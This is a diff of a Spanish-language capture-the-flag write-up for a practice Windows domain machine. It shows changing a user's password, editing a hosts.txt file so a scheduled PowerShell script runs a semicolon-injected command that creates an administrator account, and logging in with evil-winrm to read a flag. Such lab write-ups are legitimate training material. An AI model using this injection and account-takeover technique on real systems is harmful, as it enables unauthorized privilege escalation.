@@ -858,7 +858,7 @@ Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-20
 
   - Vamos a intentar cambiar la clave del usuario --> brittanycr , e intentar loguearnos en el sistema con evil-winrm
 
-        *Evil-WinRM* PS C:\scripts> net user brittanycr NuevaContrasena#1234
+        *Evil-WinRM* PS C:\scripts> net user brittanycr NewPass+1234
         The command completed successfully.
 
     Intentamos hacer login mediante evil-winrm pero no fue exitoso, por lo que necesitamos otro punto de entrada.
@@ -880,19 +880,100 @@ Explicacion del exploit ---> https://github.com/theart42/cves/blob/master/cve-20
         SMB         windcorp.thm    445    FIRE             SYSVOL          READ            Logon server share 
         SMB         windcorp.thm    445    FIRE             Users           READ     
 
-    Nos conectamos a la raiz del usuario brittanycr y hay tenemos nuestro deseado fichero.
+    - Nos conectamos a la raiz del usuario brittanycr y hay tenemos nuestro deseado fichero.
     
-        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
-        └─# smbclient //windcorp.thm/Users -U brittanycr
-        Password for [WORKGROUP\brittanycr]:
-        Try "help" to get a list of possible commands.
-        smb: \> cd brittanycr
-        smb: \brittanycr\> dir
-          .                                   D        0  Sun May  3 01:36:46 2020
-          ..                                  D        0  Sun May  3 01:36:46 2020
-          hosts.txt                           A       22  Sun May  3 15:44:57 2020
+          ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/ra1.1]
+          └─# smbclient //windcorp.thm/Users -U brittanycr
+          Password for [WORKGROUP\brittanycr]:
+          Try "help" to get a list of possible commands.
+          smb: \> cd brittanycr
+          smb: \brittanycr\> dir
+            .                                   D        0  Sun May  3 01:36:46 2020
+            ..                                  D        0  Sun May  3 01:36:46 2020
+            hosts.txt                           A       22  Sun May  3 15:44:57 2020
 
-    Lo descargamos y preparamos para que cuando se ejecute mediante el script checkservers.ps1 consigamos elevar privileos.
+    - Proceso para elevar privilegios.
+
+          Crearemos un usuario nuevo en el sistema y le vamos a decir que pertenece al grupo administrators.
+
+    1)  Emulamos el proceso que realizara el script Powershell en nuestra maquina local, vemos que funciona correctamente.
+      
+          NOTA: En PowerShell, el punto y coma (;) se utiliza como un separador de comandos.
+
+        ![image](https://github.com/Esevka/CTF/assets/139042999/5862d928-c722-4c31-9bbb-614c54b484fc)
+        
+
+    2) Descargamos, editamos y subimos el fichero hosts.txt para intentar elevar privilegios.
+  
+            smb: \brittanycr\> get hosts.txt 
+            getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+
+       ![image](https://github.com/Esevka/CTF/assets/139042999/786adcba-d915-462e-84ab-299923e8b425)
+
+            smb: \brittanycr\> put hosts.txt hosts.txt
+            putting file hosts.txt as \brittanycr\hosts.txt (0.5 kb/s) (average 0.4 kb/s)
+       
+    
+    4) Esperamos un poco a que el sistema ejecute la tarea programada y veremos si nuestro exploit se ha ejecutado correctamente.
+       Como vemos estamos logueados como usuario --> buse ; El script se ha ejecutado correctamente y nos ha creado nuestro nuevo usuario EsevKa.
+        
+            *Evil-WinRM* PS C:\users> whoami
+            windcorp\buse
+   
+       
+            *Evil-WinRM* PS C:\users> net user Esevka
+            User name                    EsevKa
+            Full Name
+            Comment
+            User's comment
+            Country/region code          000 (System Default)
+            Account active               Yes
+            Account expires              Never
+            
+            Password last set            10/7/2023 10:42:35 PM
+            Password expires             11/18/2023 10:42:35 PM
+            Password changeable          10/8/2023 10:42:35 PM
+            Password required            Yes
+            User may change password     Yes
+            
+            Workstations allowed         All
+            Logon script
+            User profile
+            Home directory
+            Last logon                   Never
+            
+            Logon hours allowed          All
+            
+            Local Group Memberships      *Administrators
+            Global Group memberships     *Domain Users
+            The command completed successfully.
+
+    5) Logueamos como Esevka y obtenemos flag 3.
+   
+            ┌──(root㉿kali)-[/home/kali]
+            └─# evil-winrm -i windcorp.thm -u EsevKa -p NewPass+1234 
+                                                    
+            Evil-WinRM shell v3.5                                   
+            Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                      
+            Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                       
+            Info: Establishing connection to remote endpoint
+             
+            *Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+            
+                Directory: C:\Users\Administrator\Desktop
+            
+            Mode                LastWriteTime         Length Name
+            ----                -------------         ------ ----
+            -a----         5/7/2020   1:22 AM             47 Flag3.txt
+            
+            *Evil-WinRM* PS C:\Users\Administrator\Desktop> type Flag3.txt
+            THM{ba3a2bff2e535--------283890faae54ac2ef}
+
+
+---
+---> Maquina Ra1 completa. <---
+---
+        
 
 
 
